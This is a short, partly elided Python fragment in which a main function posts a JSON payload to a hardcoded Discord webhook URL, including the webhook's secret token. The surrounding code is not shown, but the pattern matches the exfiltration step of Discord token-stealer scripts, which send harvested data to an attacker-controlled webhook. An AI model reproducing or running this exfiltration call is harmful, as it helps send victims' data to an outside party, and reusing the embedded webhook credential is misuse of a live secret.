...
def main():
    ...
    try:
        urlopen(Request("https://discord.com/api/webhooks/1103404092778369055/JgCgofVH_25OEdlpkVUkmm_btajW44ecAlygIjtRsC-PGHbFJ5Etxg3RZCzTYEw81VTi", data=dumps(webhook).encode(), headers=getheaders()))   
